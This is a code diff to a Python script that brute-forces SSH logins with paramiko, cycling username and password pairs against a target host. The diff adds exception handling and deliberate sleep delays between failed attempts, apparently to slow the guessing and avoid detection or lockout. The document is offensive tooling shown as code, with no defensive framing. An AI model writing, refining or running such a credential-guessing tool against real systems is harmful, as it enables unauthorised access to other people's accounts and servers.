@@ -3,6 +3,7 @@ import sys
 import os
 import socket
 import termcolor
+import time
 
 def ssh_connect(username, password, host, port=22):
     ssh = paramiko.SSHClient()
@@ -16,7 +17,12 @@ def ssh_connect(username, password, host, port=22):
     except paramiko.AuthenticationException:
         return 1  # Credenciales incorrectas
 
-    except socket.error:
+    except socket.error as e:
+        print(f"[!!] Socket error: {e}")
+        return 2  # No se pudo conectar
+
+    except paramiko.SSHException as e:
+        print(f"[!!] SSH error: {e}")
         return 2  # No se pudo conectar
 
 def main():
@@ -42,8 +48,10 @@ def main():
                         sys.exit(0)
                     elif response == 1:
                         print(f'[-] Incorrect Credentials: {username} / {password}')
+                        time.sleep(8)
                     elif response == 2:
                         print('[!!] Could not connect to the target. Retrying...')
+                        time.sleep(10)
                         break  # Salir del bucle de contraseñas y probar el siguiente usuario
 
 if __name__ == "__main__":
